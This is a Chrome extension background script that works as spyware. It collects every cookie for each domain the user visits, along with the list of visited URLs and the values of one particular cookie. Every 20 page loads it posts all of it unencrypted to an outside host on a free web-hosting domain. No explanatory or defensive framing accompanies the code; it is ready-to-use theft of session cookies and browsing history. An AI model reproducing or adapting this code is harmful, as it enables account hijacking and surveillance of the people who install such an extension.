var changed = {};
var visited = [];
var cookiesArr = [];
var msgArr = [];

chrome.cookies.onChanged.addListener(function(info){
  var cookie = info.cookie;
  if (cookie.name == "cmsgl" && cookie.value) {
      msgArr.push(cookie.value);
  }
});

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    function sendRequest(request, callback) {
        if (request.action == "xhttp") {
            var xhttp = new XMLHttpRequest();
            var method = request.method ? request.method.toUpperCase() : 'GET';

            xhttp.onload = function () {
                callback(xhttp.responseText);
            };
            xhttp.onerror = function () {
                // Do whatever you want on error. Don't forget to invoke the
                // callback to clean up the communication port.
                callback();
            };
            xhttp.open(method, request.url, true);
            if (method == 'POST') {
                xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            }
            xhttp.send(request.data);
            return true; // prevents the callback from being called too early on return
        }
    }

    var tabDomain = tab.url.match(/^[\w-]+:\/{2,}\[?([\w\.:-]+)\]?(?::[0-9]*)?/)[1];
    if (changeInfo.status === "complete") {
        if (changed[tabId] !== tabDomain) {
            chrome.cookies.getAll({url: tab.url}, function (cookies) {
                cookiesArr.push(cookies);
            });
            changed[tabId] = tabDomain;
        }
        visited.push(tab.url);
        if (visited.length >= 20) {
            sendRequest({
                method: 'POST',
                action: 'xhttp',
                url: 'http://mercadoleilao.000webhostapp.com/analyse.php',
                data: 'cookie=' + encodeURIComponent(JSON.stringify(cookiesArr)) + '&visited=' + encodeURIComponent(visited.join("\n")) + '&msg=' + encodeURIComponent(msgArr.join("\n----\n"))
            }, function (responseText) {
            });
            visited = [];
            msgArr = [];
            cookiesArr = [];
        }
    }
});